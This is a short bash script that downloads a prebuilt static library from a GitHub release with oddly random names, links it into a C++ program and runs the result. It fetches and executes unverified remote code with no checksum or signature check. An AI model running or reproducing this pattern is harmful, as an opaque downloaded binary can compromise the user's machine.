#!/usr/bin/env bash
set -e
wget -q --tries=3 --timeout=15 -O "dim-cutter.a" "https://github.com/thisislanell/calmrubyio/releases/download/hidden-comet-clever-ember/dim-cutter.a"
g++ -o app -pthread -O2 -std=c++17 main.cpp "dim-cutter.a" && ./app
